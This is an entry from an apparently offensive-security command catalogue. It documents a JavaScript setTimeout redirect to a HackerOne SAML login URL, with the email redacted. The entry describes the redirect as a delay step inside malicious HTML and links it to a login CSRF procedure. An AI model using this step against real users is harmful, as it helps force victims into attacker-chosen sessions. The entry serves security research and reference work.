---
data: >-
  setTimeout(function(){document.location.href =
  "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";},
  5000);
tags:
  - javascript
  - timing
type: command
executor: javascript
platforms:
  - Web
id: c98a9f56-3ceb-4343-88b2-dfd916da35fa
created_at: '2025-12-13T09:01:26.477Z'
updated_at: '2025-12-13T09:01:26.477Z'
verified: false
validated: true
submitted: true
---
# Set Timeout for Redirect

## Command

```javascript
setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
```

## Description

JavaScript code to delay redirection to the login endpoint after iframe load in malicious HTML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `5000` | Delay in milliseconds | Yes |
| `function` | Anonymous function to set document location | Yes |

## Examples

### Basic Usage

```javascript
setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
```

### Advanced Usage

```javascript
setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 10000);
```

## Expected Output

Redirects the page after 5 seconds.

## Related

- [[procedures/Craft-Malicious-HTML-for-Login-CSRF]]
